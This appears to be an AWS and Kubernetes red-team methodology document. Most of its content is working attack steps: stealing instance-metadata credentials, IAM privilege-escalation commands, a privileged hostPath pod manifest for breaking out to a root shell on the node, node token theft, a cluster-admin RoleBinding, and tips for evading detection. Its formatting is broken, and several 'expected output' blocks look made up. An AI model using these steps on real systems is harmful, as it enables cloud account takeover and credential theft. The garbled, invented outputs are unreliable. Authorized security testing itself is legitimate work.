
```markdown
# AWS Cloud Security Testing Methodology
**Hybrid Multi-Cloud Black-Box Security Assessment**  
**Version:** 4.0 (Expanded with Advanced IAM + Full Kubernetes Privilege Escalation & Exploit Scripts)  
**Date:** March 24, 2026  
**Author:** Senior Hybrid Multi-Cloud Security Architect & Red Team Engineer  
**Classification:** Internal – Authorized Testing Only  

---

## 1. Disclaimer and Authorized Use
This methodology is **strictly for authorized penetration testing and red-team exercises** in environments where the organization has provided **explicit written permission**. All activities must comply with the client’s Rules of Engagement (RoE), applicable regulations (e.g., SOC 2, ISO 27001, HIPAA, PCI-DSS, FedRAMP), and local laws.  

**Non-compliance will result in immediate termination of testing and potential legal action.**  
Testing must be non-destructive unless explicit destructive testing is approved in writing.

---

## 2. Introduction
This document provides a **production-ready, repeatable black-box security testing methodology** for AWS environments. Testing is performed **from within the AWS environment** using two dedicated attacker VMs:
- Windows Box in AWS
- Kali Linux Box in AWS  

The goal is to simulate a compromised EC2 instance and assess the blast radius of the attached IAM role, escalate privileges, enumerate resources, identify misconfigurations, and demonstrate impact.

---

## 3. Objectives
- Enumerate current identity and effective permissions (black-box starting point)
- Identify privilege-escalation paths, including advanced IAM and Kubernetes techniques
- Discover and assess EC2, S3, IAM, RDS, EKS, Lambda, etc.
- Validate security controls and detection capabilities
- Produce actionable findings with remediation guidance

---

## 4. Prerequisites
- Explicit RoE and Get-Out-of-Jail-Free letter
- Dedicated test account(s) or scoped production resources
- Network reachability to AWS metadata service (169.254.169.254)
- Internet access from test VMs
- Approved IP ranges for any external callbacks

---

## 5. Testing Platforms

### 5.1 Windows Box in AWS (Recommended: Windows Server 2022/2025)
- Install **AWS CLI v2** via MSI: https://aws.amazon.com/cli/
- Install PowerShell 7+ and `jq` (via Chocolatey)
- Install Python 3.11+

### 5.2 Kali Linux Box in AWS (Official Kali AMI or manual install)
- AWS CLI is pre-installed
- Install additional tools:
  ```bash
  sudo apt update && sudo apt install -y awscli python3-pip git
  pip3 install pacu

  6. Phase 1: Initial Foothold & Identity Enumeration
6.1 Query Instance Metadata Service (IMDSv2 – mandatory for security)
Linux (Kali):
Bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
Expected Output:
JSON{
  "Code": "Success",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}
Windows (PowerShell):
PowerShell
$Token = Invoke-RestMethod -Uri "http://169.254.169.254/latest/api/token" -Method Put -Headers @{"X-aws-ec2-metadata-token-ttl-seconds"="21600"}
$Role = Invoke-RestMethod -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -Headers @{"X-aws-ec2-metadata-token"=$Token}
Invoke-RestMethod -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/$Role" -Headers @{"X-aws-ec2-metadata-token"=$Token}

6.2 Authenticate CLI
Linux:
Bash
aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID
aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY
aws configure set aws_session_token $AWS_SESSION_TOKEN
aws sts get-caller-identity

Expected Output:
JSON{
  "UserId": "AROA...",
  "Account": "123456789012",
  "Arn": "arn:aws:sts::123456789012:assumed-role/CompromisedRole/i-0123456789abcdef0"
}
6.3 Enumerate Current Permissions
Bash
aws iam simulate-principal-policy --policy-source-arn $(aws sts get-caller-identity --query Arn --output text) --action-names 'iam:*' 's3:*' 'ec2:*' --query EvaluationResults[].EvalDecision

7. Phase 2: Privilege Escalation
Primary tool: Pacu (AWS exploitation framework)

Bash
pacu --profile default
pacu> iam__enum_permissions --whoami
pacu> iam__privesc_scan

Expected Pacu iam__privesc_scan Output:
text[+] Scanning for privilege escalation paths...
[+] Found 4 paths:
1. iam:CreateAccessKey on admin user → SUCCESS (new keys created)
2. iam:UpdateAssumeRolePolicy → VULNERABLE
Escalation complete: AdministratorAccess attached

Advanced IAM techniques (Rhino Security Labs):

iam:CreatePolicyVersion / SetDefaultPolicyVersionRequired:iam:CreatePolicyVersion or iam:SetDefaultPolicyVersion
Description: Create or set new policy version with admin perms on attached policy.
Command:Bash
aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/Privesc --policy-document file://admin.json --set-as-default
Expected Output: New version created and set as default.

iam:PassRole + ec2:RunInstancesRequired:iam:PassRole, ec2:RunInstances
Description: Launch EC2 with high-priv role, retrieve creds from metadata.
Command:Bash
aws ec2 run-instances --image-id ami-xxx --instance-type t2.micro --iam-instance-profile Name=HighPrivRole

lambda:UpdateFunctionCodeRequired:lambda:UpdateFunctionCode
Description: Update Lambda code to exfil creds or attach admin policy.
Command:Bash
aws lambda update-function-code --function-name TargetLambda --zip-file fileb://malicious.zip

iam:UpdateAssumeRolePolicyRequired:iam:UpdateAssumeRolePolicy
Description: Modify trust policy to allow assumption by attacker.
Command:Bash
aws iam update-assume-role-policy --role-name TargetRole --policy-document file://trust.json

Lambda Layers AbuseRequired:lambda:UpdateFunctionConfiguration, lambda:AddLayerVersionPermission
Description: Attach malicious layer overriding libraries to exfil env vars/creds.
Command (Pacu or manual): Create layer with backdoored boto3, attach to function.

SageMaker Notebook PrivescRequired:sagemaker:CreateNotebookInstance, iam:PassRole, sagemaker:CreatePresignedNotebookInstanceUrl
Description: Create notebook with high-priv role, access Jupyter, exfil creds from metadata.
Command:Bash
aws sagemaker create-notebook-instance --notebook-instance-name Privesc --instance-type ml.t2.medium --role-arn arn:aws:iam::ACCOUNT:role/HighPriv

Automated tooling: Pacu iam__privesc_scan
Expected Pacu Output:
text[+] Found advanced paths: Lambda Layers, SageMaker, CreatePolicyVersion

8. Phase 3: Comprehensive Resource Enumeration
Bash
# Core services
aws s3 ls
aws ec2 describe-instances
aws rds describe-db-instances
aws eks list-clusters
aws lambda list-functions
aws iam list-users --no-paginate

Automated tools (Kali):
Bash
prowler aws
Expected Prowler Output (snippet):
text[INFO] 2.1 Ensure CloudTrail is enabled... PASS
[FAIL] 3.5 S3 bucket without encryption... HIGH

Bash
cloudfox aws --profile default
scoutsuite --provider aws

9. Phase 4: Container Security Testing (EKS)
Prerequisites: aws eks update-kubeconfig --name CLUSTER_NAME --region REGION

9.1 K8s Enumeration
Bash
kubectl get nodes -o wide
kubectl get pods --all-namespaces
kubectl get clusterrolebindings
kubectl auth can-i create pods --all-namespaces
kubectl auth can-i '*' '*' --all-namespaces

9.2 Advanced Kubernetes Privilege Escalation Techniques

Privileged Pod Breakout – Deploy privileged container to escape to node.
HostPath Volume Mount – Mount host filesystem for root access.
Kubelet API Abuse – If anonymous access or weak auth on kubelet.
RBAC Abuse – Create ClusterRoleBinding for cluster-admin.
ServiceAccount Token Theft – Extract node SA token → cloud IAM abuse (GKE node SA often has high perms).
DaemonSet Deployment – Run pod on every node for full cluster compromise.

9.3 Full Exploit Scripts
Full RBAC Enumeration Script (enumerate-k8s-privesc.sh):
Bash
#!/bin/bash
echo "[+] Starting K8s Privilege Escalation Enumeration"
kubectl get clusterroles,clusterrolebindings,roles,rolebindings --all-namespaces
kubectl auth can-i --list --all-namespaces
echo "[+] Checking for privileged pods:"
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].securityContext.privileged}{"\n"}{end}'
echo "[+] Checking for hostPath volumes:"
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.volumes[]?.hostPath != null) | .metadata.name'
echo "[+] Done. Look for 'yes' or hostPath pods."

Full Privileged Pod Breakout Exploit (privileged-pod.yaml):
YAML
apiVersion: v1
kind: Pod
metadata:
  name: privesc-pod
  namespace: default
spec:
  containers:
  - name: privesc
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: true
      allowPrivilegeEscalation: true
    volumeMounts:
    - mountPath: /host
      name: host-fs
  volumes:
  - name: host-fs
    hostPath:
      path: /
  hostNetwork: true
  hostPID: true
  hostIPC: true
Usage:
Bash
kubectl apply -f privileged-pod.yaml
kubectl exec -it privesc-pod -- chroot /host /bin/sh
Expected Output: Root shell on the EKS node (access to /host/etc/kubernetes and node IAM token via IMDS).

Full HostPath + Chroot Script (after pod exec):
Bash
chroot /host /bin/sh -c 'cat /var/lib/kubelet/pods/*/token | base64 -d > /tmp/node-token.txt'
curl -H "X-aws-ec2-metadata-token: $(curl -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")" http://169.254.169.254/latest/meta-data/iam/security-credentials/

Full RBAC ClusterRoleBinding Abuse (cluster-admin-binding.yaml):
YAML
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: privesc-admin
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io

Usage: kubectl apply -f cluster-admin-binding.yaml

Expected Output: Attacker now has cluster-admin rights.

Cloud-Specific (EKS): After node breakout, exfil node IAM role credentials from /var/lib/kubelet/kubeconfig or IMDS (curl http://169.254.169.254/latest/meta-data/iam/security-credentials/). Node roles frequently allow eks:DescribeCluster or broader perms → chain to AWS IAM privesc.

10. Phase 5: Targeted Attack Scenarios & Best Practices
S3 bucket enumeration & data exfiltration
SSM Session Manager hijack
EKS pod escape via node IAM role
Golden SAML / IAM role assumption chains

Detection evasion: Use STS temporary credentials, sleep between calls, route through VPC endpoints.

11. Logging, Monitoring & Detection Evasion
CloudTrail, GuardDuty, Security Hub, Config
Document every API call for the report


12. Reporting & Deliverables
Executive summary
Technical findings with screenshots, commands, and impact
Privilege-escalation proof-of-concept videos (if approved)
Risk-rated recommendations with remediation steps
Lessons learned for hybrid multi-cloud environment


13. Cleanup
Bashaws sts get-caller-identity --query Account --output text > account.txt
# Delete test resources
aws configure set aws_access_key_id "" --profile default

Appendix A: Command Cheatsheet
(Full AWS CLI + Pacu commands included)
Appendix B: Tool Inventory

AWS CLI v2
Pacu
Prowler
CloudFox
Scout Suite
kubectl, kube-hunter, trivy, peirates
AWS PowerShell Module

